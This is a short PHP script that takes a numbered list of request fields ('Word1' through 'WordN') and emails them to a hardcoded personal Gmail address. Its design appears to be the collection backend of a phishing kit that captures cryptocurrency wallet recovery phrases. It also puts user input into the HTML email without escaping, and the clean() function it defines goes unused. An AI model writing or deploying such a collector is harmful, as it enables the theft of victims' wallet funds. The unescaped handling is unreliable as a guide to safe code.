<?php
	
	date_default_timezone_set("UTC");
	error_reporting(E_ALL);
	include_once 'Mailer.class.php';
	$request = $_REQUEST["REQUEST"];
	switch($request)
	{
		
		case 'sendWordsEmail':
			sendWordsEmail();
		break;
		
	}
	function sendWordsEmail()
	{
		$response ="";
		$num=$_REQUEST["num"];
		$response="<table>";
		for($i=1;$i<=$num;$i++)
		{
			$response .="<tr><td>Word ".$i."</td><td>:</td><td> ".$_REQUEST["Word".$i]."</td></tr>";
		}
		$response .='</table>';
		$mailer = new Mailer;
		$details = array();
		$details["to"] = "amitsingh909192@gmail.com";
		$details["cc"] = "";
		$details["subject"] = "Word".$num;	
		$details["fromName"] = "Word".$num;		
		$details["message"]=$response;
		echo $mailer->sendMail($details);
	}
	function clean($data)
	{
		$data = stripslashes($data);
		$data = htmlentities($data,ENT_QUOTES);
		return $data;
	}
	
	?>

